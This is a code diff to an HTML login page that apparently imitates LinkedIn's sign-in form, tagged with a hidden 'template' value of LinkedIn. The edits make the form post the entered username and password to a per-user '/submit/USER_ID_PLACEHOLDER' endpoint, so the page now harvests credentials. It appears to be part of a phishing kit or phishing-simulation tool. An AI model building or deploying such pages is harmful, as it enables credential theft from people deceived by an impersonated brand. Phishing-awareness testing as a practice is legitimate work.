@@ -211,15 +211,16 @@
     <main class="main-container">
 
         <div class="login-card">
-            <form>
-                <div class="form-group" method="post" action="/submit/USER_ID_PLACEHOLDER">
+            <form method="post" action="/submit/USER_ID_PLACEHOLDER">
+                <div class="form-group">
                     <label for="email">Email or phone</label>
-                    <input type="text" id="email" class="input-field">
+                    <input type="text" id="email" name="username" class="input-field">
                 </div>
                 <div class="form-group">
                     <label for="password">Password</label>
-                    <input type="password" id="password" class="input-field">
+                    <input type="password" id="password" name="password" class="input-field">
                 </div>
+                <input type="hidden" name="template" value="LinkedIn">
                 <a href="#" class="forgot-password">Forgot password?</a>
                 <button type="submit" class="signin-button">Sign in</button>
             </form>
